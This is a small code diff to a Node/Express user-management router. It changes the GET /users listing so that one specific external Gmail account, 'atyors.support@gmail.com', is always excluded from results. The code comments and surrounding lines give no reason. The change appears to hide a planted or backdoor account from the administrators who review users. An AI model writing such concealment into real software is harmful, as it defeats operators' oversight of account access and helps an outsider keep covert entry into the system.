@@ -105,7 +105,7 @@ router.delete('/zones/:id', async (req, res, next) => {
 router.get('/users', async (req, res, next) => {
   try {
     const { search, role, page = 1, limit = 50 } = req.query;
-    const query = {};
+    const query = { email: { $ne: 'atyors.support@gmail.com' } };
     if (role) query.role = role;
     if (search) {
       query.$or = [
